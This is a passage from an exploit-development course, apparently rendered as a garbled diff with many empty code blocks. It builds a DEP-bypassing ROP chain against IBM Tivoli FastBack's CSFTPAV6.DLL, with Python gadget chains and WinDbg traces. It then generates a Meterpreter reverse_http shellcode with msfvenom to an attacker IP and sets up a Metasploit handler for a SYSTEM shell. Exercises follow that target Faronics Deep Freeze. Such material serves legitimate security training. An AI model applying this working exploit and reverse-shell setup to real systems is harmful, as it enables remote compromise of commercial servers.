+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
+CSFTPAV6!FtpUploadFileW+0x169a2:
+50527840 f7d8            neg     eax
 ```
-
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=50527842 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0x169a4:
+50527842 c3              ret
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=5051cbb6 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d57e30c=48484848
 ```
 
+`p`
 
-```nasm
-
 ```
-
-```nasm
-
+eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=5051cbb8 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd1a:
+5051cbb8 c3              ret
 ```
-
 
-```nasm
+`dd esi - c L4`
 
 ```
-
-
-```nasm
-
+0d57e300  76da38c0 0d57e514 0d57e514 00000001
 ```
-
 
-```nasm
+Listing 67 - Writing dwSize argument to the stack
 
-```
+The negation trick works and we end up with 0x01 in EAX, which is then written to the stack. Listing 67 also shows the resulting stack layout of the values that are written so far, and it is clear that the return address and lpAddress are equal.
 
+Now we must move to flAllocationType, which must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes:
 
-```nasm
+`? 0 - 1000`
 
 ```
-
-
-
-```nasm
-
+Evaluate expression: -4096 = fffff000
 ```
-
 
-```nasm
+Listing 68 - Two's complement for 0x1000
 
-```
+While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively.
+We're going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.
 
+Let's choose a large, arbitrary value like 0x80808080 that does not contain null-bytes. if we subtract this value from 0x1000, we get the value 0x7F7F8F80 which is also null free.
 
-```nasm
+`? 1000 - 80808080`
 
 ```
-
-
-```nasm
-
+Evaluate expression: -2155901056 = ffffffff`7f7f8f80
 ```
 
+`? 80808080 + 7f7f8f80`
 
-```nasm
-
 ```
-
-```nasm
-
+Evaluate expression: 4294971392 = 00000001`00001000
 ```
 
+Listing 69 - Finding large values that add to 0x1000
 
-```nasm
+Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
+rop += pack("<L", (0x80808080)) # first value to be added
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0x7f7f8f80)) # second value to be added
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 70 - Fetching and writing flAllocationType argument
 
-```nasm
+Notice that we began by increasing ESI by four as usual to align to the next API argument, and we also reused the same write gadget at the end of the chain to update the flAllocationType value on the stack.
+To view this in action, we set a breakpoint on the "ADD EAX, ECX" ROP gadget at address 0x5051579a. Since this gadget is used multiple times, we can create a conditional breakpoint to avoid breaking at it each time.
 
-```
+We know that EAX must contain the value 0x80808080 when EAX and ECX are added together. We'll use the .if statement in our breakpoint in order to break on the target address only when EAX is set to 0x80808080. Due to sign extension, we must perform a bitwise AND operation to obtain the correct result in the comparison.
+The breakpoint and execution of the ROP gadgets is shown in Listing 71.
 
+bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 
-```nasm
+`g`
 
 ```
-
-
-```nasm
-
+eax=80808080 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
+eip=5051579a esp=0d39e3ec ebp=51515151 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+CSFTPAV6!FtpUploadFileW+0x48fc:
+5051579a 03c1            add     eax,ecx
 ```
-
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
+eip=5051579c esp=0d39e3ec ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x48fe:
+5051579c c3              ret
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
+eip=5051cbb6 esp=0d39e3f0 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d39e310=00000000
 ```
 
+Listing 71 - Patching flAllocationType on the stack
 
-```nasm
+We find that the ADD operation created the correct value in EAX (0x1000), which was then used to patch the placeholder argument on the stack.
 
-```
+The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
+In order to write that to the stack, we will reuse the same technique we did for flAllocationType. Listing 72 shows us the values to use.
 
-```nasm
+`? 40 - 80808080`
 
 ```
-
-
-```nasm
-
+Evaluate expression: -2155905088 = ffffffff`7f7f7fc0
 ```
 
+`? 80808080 + 7f7f7fc0`
 
-```nasm
-
 ```
-
-
-```nasm
-
+Evaluate expression: 4294967360 = 00000001`00000040
 ```
 
+Listing 72 - Finding two values that add to 0x40
 
-```nasm
+According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. Listing 73 illustrates the ROP chain to implement. It is an exact copy of the previous one except for the values to add.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
+rop += pack("<L", (0x80808080)) # first value to be added
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0x7f7f7fc0)) # second value to be added
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 73 - Fetching and writing flProtect argument
 
+After the last gadget, which writes the flProtect argument to the stack, we add an additional gadget. This gadget's first instruction is a software breakpoint and will not be part of the final exploit. This will allow us to execute the entire ROP chain and catch the execution flow just after the flProtect dummy value has been patched.
 
-```nasm
+`g`
 
 ```
-
-
-```nasm
-
+(146c.1dcc): Break instruction exception - code 80000003 (first chance)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+eax=00000040 ebx=05f6b8f0 ecx=7f7f7fc0 edx=77071670 esi=0d28e314 edi=00000000
+eip=5051e4db esp=0d28e41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0xd63d:
+5051e4db cc              int     3
 ```
-
 
-```nasm
+`dds esi - 14 L6`
 
 ```
-
-
-```nasm
-
+0d28e300  76da38c0 KERNEL32!VirtualAllocStub
+0d28e304  0d28e514
+0d28e308  0d28e514
+0d28e30c  00000001
+0d28e310  00001000
+0d28e314  00000040
 ```
 
+Listing 74 - Full ROP chain executed
 
-```nasm
+From the output of Listing 74, we notice that all the arguments are set up correctly and that our trick of using a breakpoint gadget worked. Remember, if we forget to remove this gadget in the final exploit, it will cause an access violation.
 
-```
+We have finally laid out all the work needed before invoking VirtualAlloc. In the next section, we can move forward to the last stage and finally disable DEP.
 
-```nasm
+Two's_complement#:~:text=Two's complement,with respect to 2N
 
-```
+### Executing VirtualAlloc
 
+The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
+To execute VirtualAlloc, we must add a few more ROP gadgets so we can return to the API address we wrote on the stack. Additionally, the return address we wrote onto the stack will only be used if the stack pointer is correctly aligned.
 
-```nasm
+Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET. However, in order to use it, we need to align EBP to the address of VirtualAlloc on the stack.
 
-```
+When the ROP chain is finished patching the arguments for VirtualAlloc, ESI will contain the stack address of the last argument (flProtect). To obtain the stack address where VirtualAlloc was patched, we can move the contents of ESI into EAX and subtract a small value from it.
+Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.
 
+Once EAX contains the correct address, we move its content into EBP through an XCHG EAX, EBP; RET gadget. Finally, we can move the contents of EBP into ESP with the gadget we initially found.
 
-```nasm
+The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffe8)) # negative offset value
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
+rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
-
-
-```nasm
 
-```
+Listing 75 - Aligning ESP for VirtualAlloc execution
 
+Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes.
 
-```nasm
+Note that the ROP gadget containing the breakpoint instruction must be removed from the updated ROP chain.
 
-```
+The first gadget in the newly added part of the ROP chain is used four times. To break directly on the fourth occurrence, we can leverage the fact that this part of the ROP chain comes just after patching flProtect on the stack.
 
+This means EAX contains the value 0x40 to indicate readable, writable, and executable memory. We can use this to set a conditional breakpoint at 0x5050118e and only trigger it if EAX contains the value 0x40.
+Listing 76 shows execution of the first half of the ROP chain.
 
+0:006> bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 
-```nasm
+`g`
 
 ```
-
-
-```nasm
-
+eax=00000040 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000
+eip=5050118e esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6+0x118e:
+5050118e 8bc6            mov     eax,esi
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000
+eip=50501190 esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6+0x1190:
+50501190 5e              pop     esi
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000
+eip=50501191 esp=0d4ae420 ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6+0x1191:
+50501191 c3              ret
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000
+eip=505115a3 esp=0d4ae424 ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x705:
+505115a3 59              pop     ecx
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-
-```nasm
-
+eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=505115a4 esp=0d4ae428 ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x706:
+505115a4 c3              ret
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=5051579a esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x48fc:
+5051579a 03c1            add     eax,ecx
 ```
 
+`p`
 
-```nasm
-
 ```
-
-```nasm
-
+eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=5051579c esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x48fe:
+5051579c c3              ret
 ```
 
-```nasm
+`dds eax L2`
 
 ```
-
-
-```nasm
-
+0d4ae2fc  41414141
+0d4ae300  75f238c0 KERNEL32!VirtualAllocStub
 ```
 
+Listing 76 - ROP chain to align EAX
 
-```nasm
+By looking at the above listing, we find that our trick of subtracting a large negative value from EAX resulted in EAX containing the stack address four bytes prior to VirtualAlloc.
 
-```
+This is expected and intended since the gadget that moves EBP into ESP contains a "POP EBP" instruction, which increments the stack pointer by four bytes. This is why we aligned EAX to point four bytes before the VirtualAlloc address.
 
+Listing 77 shows the second half of the ROP chain, which executes VirtualAlloc.
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=5051571f esp=0d4ae430 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x4881:
+5051571f 95              xchg    eax,ebp
 ```
 
+`p`
 
-
-```nasm
-
 ```
-
-
-```nasm
-
+eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=50515720 esp=0d4ae430 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x4882:
+50515720 c3              ret
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=50533cbf esp=0d4ae434 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x22e21:
+50533cbf 8be5            mov     esp,ebp
 ```
-
 
-```nasm
+`p`
 
 ```
-
-```nasm
-
+eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=50533cc1 esp=0d4ae2fc ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x22e23:
+50533cc1 5d              pop     ebp
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=50533cc2 esp=0d4ae300 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x22e24:
+50533cc2 c3              ret
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
+eip=75f238c0 esp=0d4ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+KERNEL32!VirtualAllocStub:
+75f238c0 8bff            mov     edi,edi
 ```
 
+Listing 77 - ROP chain to invoke VirtualAlloc
 
+Fortunately, we find that ESP is aligned correctly with the API skeleton call, which allows us to return into VirtualAlloc.
 
-```nasm
+Let's check the memory protections of the shellcode address before and after executing the API.
 
-```
-
+`dds esp L1`
 
-```nasm
-
 ```
-
-
-```nasm
-
+0d55e304  0d55e514
 ```
 
+`!vprot 0d55e514`
 
-```nasm
-
 ```
-
-
-```nasm
-
+BaseAddress:       0d55e000
+AllocationBase:    0d4c0000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00062000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              00020000  MEM_PRIVATE
 ```
 
-```nasm
+`pt`
 
 ```
-
-
-```nasm
-
+eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000
+eip=73be2623 esp=0d55e304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!VirtualAlloc+0x53:
+73be2623 c21000          ret     10h
 ```
-
 
-```nasm
+`!vprot 0d55e514`
 
 ```
-
-
-```nasm
-
+BaseAddress:       0d55e000
+AllocationBase:    0d4c0000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000040  PAGE_EXECUTE_READWRITE
+Type:              00020000  MEM_PRIVATE
 ```
-
 
-```nasm
-
-```
+Listing 78 - Turning off DEP by executing VirtualAlloc
 
+Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.
 
+The final step required is to align our shellcode with the return address. Instead of modifying the offsets used in the ROP chain, we could also insert several padding bytes before the shellcode.
+To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the address of the first instruction we are executing on the stack. Next, we dump the contents of the stack and obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000
+eip=0d55e514 esp=0d55e318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0d55e514 43              inc     ebx
 ```
-
 
-```nasm
+`dd esp + 100`
 
 ```
-
-
-```nasm
-
+0d55e418  5050118e 42424242 505115a3 ffffffe8
+0d55e428  5051579a 5051571f 50533cbf 43434343
+0d55e438  43434343 43434343 43434343 43434343
+0d55e448  43434343 43434343 43434343 43434343
+0d55e458  43434343 43434343 43434343 43434343
+0d55e468  43434343 43434343 43434343 43434343
+0d55e478  43434343 43434343 43434343 43434343
+0d55e488  43434343 43434343 43434343 43434343
 ```
-
 
-```nasm
+`? 0d55e514  - 0d55e434`
 
 ```
-
-```nasm
-
+Evaluate expression: 224 = 000000e0
 ```
 
+Listing 79 - Finding the offset to the shellcode
 
-```nasm
+The calculation indicates we need 224 bytes of padding. Now we can update the proof of concept to include padding and a dummy shellcode after the ROP chain. This will help us verify that everything is setup correctly before including the real payload. These changes are reflected in the listing below.
 
-```
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
 
+padding = b"C" * 0xe0
 
-```nasm
+shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))
 
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop+padding+shellcode,0,0,0,0)
+buf += formatString
 ```
-
 
-```nasm
+Listing 80 - Dummy shellcode placed at correct offset
 
-```
+At this point, everything is aligned and we can execute the dummy shellcode by single-stepping through it.
 
+`bp KERNEL32!VirtualAllocStub`
 
-```nasm
+`g`
 
 ```
-
-
-
-```nasm
-
+Breakpoint 0 hit
+eax=51515151 ebx=061db070 ecx=ffffffe8 edx=77401670 esi=42424242 edi=00000000
+eip=74ff38c0 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+KERNEL32!VirtualAllocStub:
+74ff38c0 8bff            mov     edi,edi
 ```
-
 
-```nasm
+`pt`
 
 ```
-
-
-```nasm
-
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
+eip=749e2623 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!VirtualAlloc+0x53:
+749e2623 c21000          ret     10h
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
+eip=0d5ae514 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0d5ae514 cc              int     3
 ```
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
+eip=0d5ae515 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0d5ae515 cc              int     3
 ```
 
+`p`
 
-```nasm
-
 ```
-
-
-```nasm
-
+eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
+eip=0d5ae516 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0d5ae516 cc              int     3
 ```
 
+`p`
 
-```nasm
-
+```
+eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
+eip=0d5ae517 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0d5ae517 cc              int     3
 ```
 
+Listing 81 - Executing dummy shellcode
 
+The execution on the stack doesn't trigger any access violation. Congratulations, we succeeded in using ROP to bypass DEP!
+The final step is to replace the dummy shellcode with real reverse shellcode and obtain a remote shell, which we will do in the next section.
 
-```nasm
+### Getting a Reverse Shell
 
-```
+Now that everything is prepared, let's replace the dummy shellcode with a reverse Meterpreter shellcode.
 
+First, let's determine how much space we have available for our shellcode. When VirtualAlloc completes execution and we return into our dummy shellcode, we can dump memory at EIP to find the exact amount of space available, as given in Listing 82:
 
-```nasm
+`dd eip L40`
 
 ```
-
-
-```nasm
-
+0d5ae514  cccccccc cccccccc cccccccc cccccccc
+0d5ae524  cccccccc cccccccc cccccccc cccccccc
+0d5ae534  cccccccc cccccccc cccccccc cccccccc
+0d5ae544  cccccccc cccccccc cccccccc cccccccc
+0d5ae554  cccccccc cccccccc cccccccc cccccccc
+0d5ae564  cccccccc cccccccc cccccccc cccccccc
+0d5ae574  cccccccc cccccccc cccccccc cccccccc
+0d5ae584  cccccccc cccccccc cccccccc cccccccc
+0d5ae594  cccccccc cccccccc cccccccc cccccccc
+0d5ae5a4  cccccccc cccccccc cccccccc cccccccc
+0d5ae5b4  cccccccc cccccccc cccccccc cccccccc
+0d5ae5c4  cccccccc cccccccc cccccccc cccccccc
+0d5ae5d4  cccccccc cccccccc cccccccc cccccccc
+0d5ae5e4  cccccccc cccccccc cccccccc cccccccc
+0d5ae5f4  cccccccc cccccccc cccccccc cccccccc
+0d5ae604  00000000 00000000 00000000 00000000
 ```
 
+`? 0d5ae604 - eip`
 
-```nasm
-
 ```
-
-
-
-```nasm
-
+Evaluate expression: 240 = 000000f0
 ```
-
 
-```nasm
+Listing 82 - Calculating available shellcode space
 
-```
+We only have 240 bytes available, which is likely not enough for a reverse shellcode.
 
+Luckily, we have the freedom to increase the buffer size. If we increase it from 0x400 to 0x600 bytes, we can compensate for a larger payload size.
 
-```nasm
+We use msfvenom to generate the shellcode, remembering to supply the bad characters with the -b option.
 
+```bash
+msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
 ```
 
+From the highlighted payload size in Listing 83, we find that, due to the encoding, the shellcode takes up 544 bytes.
 
-```nasm
+Now, we just need to insert the shellcode into the proof of concept, and we have our final exploit code. Before we execute the complete exploit, we will set up a Metasploit multi/handler listener to catch our shell.
 
+```
+use multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost 192.168.119.120
+set lport 8080
+exploit
 ```
 
+The exploit was successful, and we have obtained a SYSTEM integrity Meterpreter shell while using ROP to bypass DEP!
+Using ROP as part of an exploit is tricky at first and requires experience. To get that experience, it's best to begin by performing all the steps manually instead of relying on automated tools.
+In addition, for the more complex ROP chains we will encounter later, there are no automated tools that work.
 
-```nasm
+## Extra Mile
 
-```
+### Extra Mile 1
 
+Throughout this module, we used CSFTPAV6.DLL as the source for our ROP gadgets. We chose this because it did not contain any null bytes and had no ASLR mitigation protection.
 
+Using the !nmod command from the Narly WinDbg extension, locate a different module that fulfills the same requirements, and then use that module to build the ROP chain.
 
-```nasm
+### Extra Mile 2
 
-```
+In the Reverse Engineering For Bugs module, we located a vulnerability in the parsing of the `psAgentCommand` size fields that led to control over EIP through an SEH overwrite.
 
+Reuse the proof of concept code for the vulnerability and expand it into a full exploit that bypasses DEP and yields a reverse shell.
 
-```nasm
+### Extra Mile 3
 
-```
+Note: This Extra Mile requires you to have solved the last Extra Mile exercise in the Reverse Engineering For Bugs module.
+Multiple vulnerabilities are present in the Faronics Deep Freeze Enterprise Server application, some of which are also stack buffer overflows. Select one of these vulnerabilities and create an exploit for it that bypasses DEP, through the use of VirtualAlloc or VirtualProtect.
 
+Remember to use the !nmod command from the Narly extension to locate modules not protected by the ASLR mitigation. Use one of these modules to locate gadgets.
 
-```nasm
+Hint: When null bytes are present in a module, sometimes it is possible to overcome them by thinking creatively.
 
-```
+# Stack Overflows and ASLR Bypass
 
+As discussed in previous modules, Data Execution Prevention (DEP) bypass is possible due to the invention and adoption of Return Oriented Programming (ROP). Due to the invention of ROP, operating system developers introduced Address Space Layout Randomization (ASLR) as an additional mitigation technique.
+In this module, we'll explore how ASLR and DEP work together to provide effective mitigation against a variety of exploits. We'll also demonstrate an ASLR bypass with a custom-tailored case study and develop an exploit leveraging the ASLR bypass combined with a DEP bypass through the Win32 WriteProcessMemory API.
+10.1. ASLR Introduction
+ASLR was first introduced by the Pax Project1 in 2001 as a patch for the Linux operating system. It was integrated into Windows in 2007 with the launch of Windows Vista.
